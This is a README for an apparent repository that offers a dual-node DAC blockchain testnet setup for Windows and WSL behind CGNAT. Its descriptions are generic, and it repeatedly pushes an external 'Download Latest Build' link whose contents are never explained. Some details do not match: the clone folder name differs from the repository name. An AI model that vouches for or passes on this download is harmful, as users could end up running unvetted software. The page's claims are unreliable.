# DAC Dual Node CGNAT Setup v2026 - blockchain infrastructure 2026

> **A v2026 dual-node DAC testnet environment for Windows and WSL, designed for CGNAT-limited networks with static peering, monitoring, and technical reporting.**

[![Platform](https://img.shields.io/badge/Platform-Windows%20%2B%20WSL-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/lucas-hayesebs4881/dac-cgnat-dual-node-2026?style=flat-square)](https://github.com/lucas-hayesebs4881/dac-cgnat-dual-node-2026)

---

<p align="center">
  <a href="https://lucas-hayesebs4881.github.io/dac-cgnat-dual-node-2026/">
    <img src="https://img.shields.io/badge/Download-DAC%20Dual%20Node%20CGNAT%20Setup%20Latest-brightgreen?style=for-the-badge" alt="Download DAC Dual Node CGNAT Setup">
  </a>
</p>

> **[Download DAC Dual Node CGNAT Setup v2026](https://lucas-hayesebs4881.github.io/dac-cgnat-dual-node-2026/)**

---

[Download Latest Build](https://lucas-hayesebs4881.github.io/dac-cgnat-dual-node-2026/)

---

## Project Overview

DAC Dual Node CGNAT Setup provides a community-focused workflow for operating two DAC testnet nodes from a single computer. Its structure targets a Windows host paired with WSL and addresses the limitations commonly encountered when the network is behind CGNAT, including the need for deliberately configured static peers.

The repository also supports operational visibility during testing. Its materials cover monitoring and inspection workflows, with references to Grafana and Prometheus, dashboard resources, enode watcher and sender utilities, and a technical report archive for recording testnet progress and field observations.

---

## Included Capabilities

- Run a two-node arrangement on one machine
- Combine Windows and WSL in a mixed operating environment
- Apply networking patterns intended for CGNAT-restricted connections
- Define static peers for predictable node relationships
- Route node traffic across an internal LAN path
- Use node monitoring resources and dashboard-oriented materials
- Inspect and interact with nodes through enode watcher and sender tools
- Maintain technical reports documenting DAC testnet activity

---

## Getting Started

Download the latest build or clone the repository, then work from a directory on the Windows host.

1. Clone the repository:
   `git clone https://github.com/lucas-hayesebs4881/dac-cgnat-dual-node-2026.git
2. Change into the project directory:
   `cd dac-dual-node-cgnat-setup`
3. Read the supplied notes covering the Windows and WSL arrangement, peer configuration, and monitoring resources.
4. Launch the node, dashboard, or reporting pieces that match your workflow.

When using the published build, download and extract it first. The included files can then be started from the environment you have selected.

---

## Operating Workflow

The usual process begins by starting both sides of the node arrangement, checking the local route between them, and configuring the static peer information required by the CGNAT-oriented design.

A representative sequence is:

1. Launch the Windows-side and WSL-side node components.
2. Confirm that the internal network path provides connectivity.
3. Configure the static peer details before evaluating network participation.
4. Inspect node state and progress with the monitoring resources.
5. Consult the technical report archive for setup guidance and recorded observations.

For monitoring tasks, use the dashboard resources together with the Prometheus and Grafana components where those tools fit your environment.

---

## Setup and Configuration

The included setup files and node settings provide the main configuration points. Review the following areas when tailoring the deployment:

- Static peer and address values
- Internal LAN routing information
- Parameters specific to the Windows and WSL sides
- Grafana and Prometheus monitoring endpoints
- Settings used by the enode watcher and sender utilities

Before starting either node, make sure the assumptions for the Windows host, WSL instance, and local network are consistent with one another.

---

## System Requirements

- A Windows host system
- An enabled WSL environment
- Access to a local network or LAN routing path
- Connectivity conditions compatible with a CGNAT-constrained setup
- Storage for node data, monitoring resources, and report files
- Basic tools for starting and observing the DAC testnet components

---

## Frequently Asked Questions

**Does the setup require CGNAT?**  
No. CGNAT-aware networking is the primary focus, although the same ideas can also be useful for other local test configurations.

**Where are the monitoring resources documented?**  
Review the repository's dashboard materials along with its Grafana and Prometheus references.

**What is the update procedure?**  
Install the newest published build over the local files, then inspect the updated peer, routing, and monitoring notes before restarting the nodes.

**What can I check when the nodes fail to connect?**  
Verify the static peer values, local routing path, and the boundary between the Windows and WSL environments, then try again.

**Does the repository include progress documentation?**  
Yes. A technical reporting archive is provided for setup notes, field reports, and ongoing progress records.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
